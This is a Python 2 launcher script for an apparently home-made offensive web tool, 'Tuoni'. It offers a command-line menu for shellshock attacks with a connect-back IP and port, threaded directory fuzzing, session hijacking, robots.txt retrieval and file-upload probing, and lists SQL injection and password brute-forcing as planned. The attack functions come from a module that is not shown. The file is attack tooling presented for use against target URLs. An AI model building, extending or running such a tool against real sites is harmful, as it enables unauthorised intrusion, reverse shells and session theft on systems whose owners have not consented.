'''
<Tuoni - Web Attack Program>

Currently has the following capabilities:
    * Shellshock attack
    * Directory fuzzer
    * Session hijacker
    * Get robots.txt file
    * Test file upload ability


Currently working on adding:
    * 

Planning to work on:
    * Password brute-forcer
    * SQL Injection

'''

import sys
import requests
import threading

from web_attacks import get_request
from web_attacks import shellshock
from web_attacks import build_wordlist
from web_attacks import dir_fuzzer
from web_attacks import get_robots
from web_attacks import test_methods
from web_attacks import session_hijacker


def main():

    global target, wordlist_file, threads, resume, a_ip, a_port

    threads = 50

    if len(sys.argv[1:]) != 1:
        print '''
<Tuoni - Web Attack Program>\n
Options:
-1   : Perform a shellshock attack.
-2   : Perform web-directory fuzzing.
-3   : Perform SQL injection.		[Under work]
-4   : Perform password brute-forcing.	[Under work]
-5   : Perform session hijacking.
-6   : Get robots.txt file.
-7   : Test for file upload ability.
-8   : Perform all.			[Under work]
        '''
	sys.exit(0)

    option = sys.argv[1]


    if option == "-1":
        target = raw_input("Enter the target URL: ")

        a_ip = raw_input("Enter your IP: ")
        a_port = raw_input("Enter the port to connect back to: ")

        shellshock(target, a_ip, a_port)


    if option == "-2":

        url = raw_input("Enter the target URL: ")

        # The word list used for brute-forcing
        wordlist_file = raw_input("Enter the word list filepath(E.g., /opt/SVNDigger/all.txt)\n: ")

        word_queue = build_wordlist(wordlist_file)
        extensions = [".php", ".bak", ".orig", ".inc", ".pl", ".cfm", ".asp", ".js"]

        for i in range(threads):
            t = threading.Thread(target=dir_fuzzer, args=(url, word_queue, extensions))
            t.start()




    if option == "-5":
        target = raw_input("Enter the target URL: ")
        session_hijacker(target)


    if option == "-6":
        target = raw_input("Enter the target URL: ")
	get_robots(target)


    if option == "-7":
        target = raw_input("Enter the target URL: ")
        test_methods(target)




main()

